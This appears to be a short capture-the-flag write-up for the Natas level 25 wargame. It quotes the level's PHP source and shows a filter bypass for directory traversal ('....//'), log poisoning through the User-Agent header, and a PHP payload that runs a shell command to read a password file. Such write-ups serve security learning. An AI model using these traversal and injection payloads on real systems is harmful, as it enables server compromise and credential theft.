# local file inclusion and  remote code execution
	so turns out there is 2 differner files for 2 different languages and the default one is the englisg file.
	so when we choose a language one of the 2 files is set.
	The following code is used.

function setLanguage(){
        /* language setup */
        if(array_key_exists("lang",$_REQUEST))
            if(safeinclude("language/" . $_REQUEST["lang"] ))  // we can directory traverse
                return 1;
        safeinclude("language/en"); 
    }
    function safeinclude($filename){
        // check for directory traversal
        if(strstr($filename,"../")){               // but "../"" is filtered out
            logRequest("Directory traversal attempt! fixing request.");   // we can outsmart this; use "....//"; so "../" will be filtered out but "../" remains
            $filename=str_replace("../","",$filename);
        }
        // dont let ppl steal our passwords
        if(strstr($filename,"natas_webpass")){            // still we cannot access /etc/natas_webpass/natas26
            logRequest("Illegal file access detected! Aborting!");
            exit(-1);
        }
        // add more checks...
        if (file_exists($filename)) { 
            include($filename);
            return 1;
        }
        return 0;
    }
but take a look at this code:
logRequest("Directory traversal attempt! fixing request.");  // if any filtering actions occour, it is logged in a file
function logRequest($message){
        $log="[". date("d.m.Y H::i:s",time()) ."]";    // date time is written to the log file
        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];   // this is interesting; clients "user-agent" is also logged; with python requests we can supply our custom user-agent
        $log=$log . " \"" . $message ."\"\n"; 
        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
        fwrite($fd,$log);
        fclose($fd);
    }
params = {"lang": "....//....//....//....//....//path_to_the_log_file"}
so when filtering, our user agent is logged
what if we change out user agent with php code
headers = {"User-Agent": "<?php echo exec('cat /etc/natas_webpass/natas26'); ?>"}
so we get the contents of the log file which actually contains the php code to print the password for the next level
